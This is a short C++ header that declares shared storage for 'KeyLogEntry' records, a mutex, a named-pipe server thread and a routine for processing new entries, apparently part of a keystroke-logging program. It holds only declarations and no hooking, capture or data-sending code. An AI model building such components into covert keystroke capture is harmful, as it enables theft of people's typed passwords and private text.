#pragma once
#include <vector>
#include <queue>
#include <mutex>
#include "../common/common.h"

extern std::vector<KeyLogEntry> g_LogEntries;
extern std::queue<KeyLogEntry>  g_NewEntries;
extern std::mutex               g_LogMutex;

DWORD WINAPI PipeServerThread(LPVOID);
void ProcessNewEntries();